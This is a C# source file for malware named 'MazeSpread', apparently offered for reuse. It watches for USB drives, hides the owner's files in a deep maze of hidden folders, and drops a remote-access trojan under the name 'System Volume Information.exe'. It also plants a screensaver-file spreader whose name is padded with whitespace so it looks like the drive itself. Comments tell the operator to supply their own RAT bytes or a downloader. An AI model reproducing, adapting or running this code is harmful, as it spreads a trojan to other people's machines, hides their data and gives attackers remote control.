using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace MazeSpread
{
    static class Program
    {
        static string theChosen;
        static int numberDeFolders;
        static int Depth;
        static string toMove;
        static byte[] yourRATBytes; //your RAT Bytes , consider using a downloader iof
        static byte[] MazeSpreaderArtifact;//the Maze Spreader File
        [STAThread]
        static void Main()
        {
            MazeSpreaderArtifact = Properties.Resources.USB;//الملف المسؤول عن تشغيل السيرفر
            yourRATBytes = File.ReadAllBytes("D:\\Downloader.exe");
            //your RAT Bytes , consider using a downloader or read the bytes from the infected machine itself File.ReadAllBytes("D:\\1.exe");

            

            while (true)
            {

                try
                {
                    foreach (DriveInfo usb in DriveInfo.GetDrives())
                    {

                        if (usb.DriveType == DriveType.Removable && usb.IsReady)
                        {

                            toMove = "";
                            string UsbDir = usb.RootDirectory.ToString();

                            bool hasBeenInfected = false;

                            string dest = usb.RootDirectory.ToString() + "System_Operation";
                            DirectoryInfo dirInfo = new DirectoryInfo(dest);
                            if (dirInfo.Exists == false)
                            {
                                Directory.CreateDirectory(dest).Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                            }
                            /*   else {
                                   File.WriteAllText(UsbDir+"111000" , "1110");
                                   GC.Collect();
                                   Application.Restart();
                               }*/
                            DirectoryInfo dir = new DirectoryInfo(UsbDir);
                            DirectoryInfo[] dirs = dir.GetDirectories();

                            string[] files = Directory.GetFiles(UsbDir);

                            foreach (string file in files)
                            {
                            ZZx: try
                                {

                                    string name = Path.GetFileName(file);
                                    if (name.Contains("DONT_DETELTE") || name.Contains(".scr"))
                                    {
                                        hasBeenInfected = true;
                                        continue;
                                    }

                                    string destFile = Path.Combine(dest, name);


                                    if (File.Exists(dest)) File.Delete(dest);
                                    File.Move(file, destFile);
                                }
                                catch { Thread.Sleep(1000); goto ZZx; }

                            }

                            foreach (DirectoryInfo subdir in dirs)
                            {
                                if (subdir.Name.Contains("System Volume Information_"))
                                {
                                    hasBeenInfected = true;
                                    continue;
                                }
                                string temppath = Path.Combine(dest, subdir.Name);
                                if (!Directory.Exists(temppath) && !subdir.FullName.Contains("System_Operation"))
                                {
                                ZZ: try
                                    {
                                        Directory.Move(subdir.FullName, temppath);
                                    }
                                    catch { Thread.Sleep(1000); goto ZZ; }
                                }
                                //error here

                            }
                            ///maze size determinded here
                            numberDeFolders = 5;//number of folders per forlder
                            Depth = 3; // iteration 
                            if (hasBeenInfected)
                            {

                                toMove = decrypt(File.ReadAllText(UsbDir + "DONT_DETELTE")).Split(';')[0];

                            }
                            else
                            {
                                createRecursive(UsbDir, Depth);
                                toMove = theChosen + "\\" + RandomString(100, 100000);
                            }
                            // 
                            if (!Directory.Exists(toMove)) Directory.CreateDirectory(toMove);

                            MoveContentsOfDirectory(UsbDir + "\\System_Operation", toMove);
                            if (!hasBeenInfected)
                            {
                                string EvilApp = toMove + "System Volume Information.exe";

                                File.WriteAllBytes(EvilApp, yourRATBytes);

                                string fullEvil = Encrypt(toMove + ";" + EvilApp);

                                File.WriteAllText(UsbDir + "\\DONT_DETELTE", fullEvil);

                                File.SetAttributes(UsbDir + "\\DONT_DETELTE", FileAttributes.Directory | FileAttributes.Hidden);

                                string whatToName = usb.VolumeLabel;
                                if (whatToName.Equals(""))
                                {
                                    whatToName = Path.GetPathRoot(UsbDir).Replace("\\", "").Replace(":", "");
                                }
                                string empty = "                                                                                                                             .scr";
                                File.WriteAllBytes(UsbDir + "\\" + whatToName + empty, MazeSpreaderArtifact);
                            }
                        }

                    }
                    System.Threading.Thread.Sleep(100);
                }
                catch { }
                System.Threading.Thread.Sleep(100);
            }
        }
        static void MoveContentsOfDirectory(string source, string target)
        {

            try
            {
                foreach (var file in Directory.EnumerateFiles(source))
                {
                    try
                    {
                        var dest = Path.Combine(target, Path.GetFileName(file));
                        if (File.Exists(dest)) File.Delete(dest);

                        File.Move(file, dest);
                    }
                    catch { continue; }
                }

                foreach (var dir in Directory.EnumerateDirectories(source))
                {
                    try
                    {
                        var dest = Path.Combine(target, Path.GetFileName(dir));
                        if (Directory.Exists(dest)) Directory.Delete(dest, true);
                        Directory.Move(dir, dest);
                    }
                    catch { continue; }
                }

                Directory.Delete(source, true);
            }
            catch { }
        }
        public static string Encrypt(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            for (int i = 0; i < charArray.Length; i++)
            {
                charArray[i] = (char)((int)charArray[i] + 12);
            }
            return new string(charArray);
        }
        public static string decrypt(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            for (int i = 0; i < charArray.Length; i++)
            {
                charArray[i] = (char)((int)charArray[i] - 12);
            }
            return new string(charArray);
        }

        static string RandomString(int min, int max)
        {

            Random random = new Random();
            return "System Volume Information_" + random.Next(min, max).ToString();
        }

        static void createRecursive(string dir, int count)
        {

            if (count <= 0)
            {
                theChosen = dir;
                return;
            }

            List<string> alreadyin = new List<string>();
            for (int i = 0; i < numberDeFolders; i++)
            {
                string random = RandomString(100, 100000);

                while (alreadyin.Contains(random))
                {
                    random = RandomString(100, 100000);
                }
                alreadyin.Add(random);
                Directory.CreateDirectory(dir + "\\" + random).Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                createRecursive(dir + "\\" + random, count - 1);
            }
        }

    }
}
